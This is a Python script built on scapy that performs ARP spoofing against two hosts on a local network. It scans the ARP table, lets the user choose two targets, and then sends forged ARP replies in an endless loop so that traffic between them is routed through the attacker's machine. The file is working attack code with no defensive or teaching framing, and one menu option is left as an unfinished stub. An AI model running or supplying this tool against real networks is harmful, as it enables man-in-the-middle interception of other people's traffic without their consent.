#! /usr/bin/env python3

import os
import subprocess
import socket
from scapy.all import *

def select_interface():
    list_interfaces = []
    cont = 1
    for inter in socket.if_nameindex():
        list_interfaces.append(inter[1])
        print(cont, " ", inter[1])
        cont+=1

    num = int(input("Enter the interface number: "))
    return list_interfaces[num-1]

def get_mac(interface):
    try:
        result = subprocess.check_output(['ifconfig', interface])
        result = result.decode('utf-8')
        lines = result.split('\n')
        
        for line in lines:
            if 'ether' in line:
                mac_address = line.split(' ')[1]
                return mac_address
        
        return "No se pudo encontrar la dirección MAC."
    
    except subprocess.CalledProcessError:
        return "Error al ejecutar el comando ifconfig."


def scan_targets():
    try:
        result = subprocess.check_output(['arp', '-a'])
        result = result.decode('utf-8')
        lines = result.split('\n')
        targets = {}
        cont = 1
        for line in lines:
            if '?' in line:
                line_divided = line.split(' ')
                trgt_ip = line_divided[1].replace("(", "")
                trgt_ip = trgt_ip.replace(")", "")
                trgt_mac = line_divided[3]
                targets[cont] = [trgt_ip, trgt_mac]
                cont+=1
        
        for keys, value in targets.items():
            print(keys, value[0], value[1])
        
        return targets

    except subprocess.CalledProcessError:
        return "Error scanning targets"

def exploit_arp_poisoning(packet_to_t1, packet_to_t2):
    try:
        while(True):
            sendp(packet_to_t1, iface=interface) 
            sendp(packet_to_t2, iface=interface) 
    except KeyboardInterrupt:
        pass


interface = select_interface()
mac = get_mac(interface)
option = -1
while(option!=4):
    print("1. Enter targets manually")
    print("2. Scan hosts on the network")
    print("3. Run")
    print("4. Exit")
    option = int(input())

    if option == 1:
        print("a")
    elif option == 2:
        targets = scan_targets()
        print("Enter target 1 number: ")
        t1_num = int(input())
        target_1 = targets[t1_num]
        print("Enter target 2 number: ")
        t2_num = int(input())
        target_2 = targets[t2_num]
        print("Target 1: ", target_1)
        print("Target 2: ", target_2)
    elif option == 3:
        # Craft packet for target 1 
        t1_a = Ether()
        t1_b = ARP(hwlen=6, plen=4, op=2, hwsrc=mac, psrc=target_2[0], hwdst=target_1[1], pdst=target_1[0])
        packet_to_t1 = t1_a/t1_b

        # Craft packet for target 2
        t2_a = Ether()
        t2_b = ARP(hwlen=6, plen=4, op=2, hwsrc=mac, psrc=target_1[0], hwdst=target_2[1], pdst=target_2[0])
        packet_to_t2 = t2_a/t2_b
        exploit_arp_poisoning(packet_to_t1, packet_to_t2)

